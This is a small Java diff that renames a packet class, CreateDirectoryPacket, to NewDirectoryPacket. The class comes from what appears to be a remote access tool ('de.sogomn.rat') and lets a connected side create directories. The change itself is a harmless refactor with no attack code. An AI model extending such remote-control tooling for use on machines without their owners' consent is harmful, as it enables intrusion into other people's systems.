@@ -5,19 +5,19 @@ import java.io.File;
 import de.sogomn.engine.util.FileUtils;
 import de.sogomn.rat.ActiveConnection;
 
-public final class CreateDirectoryPacket implements IPacket {
+public final class NewDirectoryPacket implements IPacket {
 	
 	private String directoryPath, name;
 	
 	private static final String SEPARATOR_REGEX = "[\\\\\\/]";
 	private static final String SEPARATOR = "/";
 	
-	public CreateDirectoryPacket(final String path, final String name) {
+	public NewDirectoryPacket(final String path, final String name) {
 		this.directoryPath = path.replaceAll(SEPARATOR_REGEX, SEPARATOR);
 		this.name = name;
 	}
 	
-	public CreateDirectoryPacket() {
+	public NewDirectoryPacket() {
 		this("", "");
 	}
 	
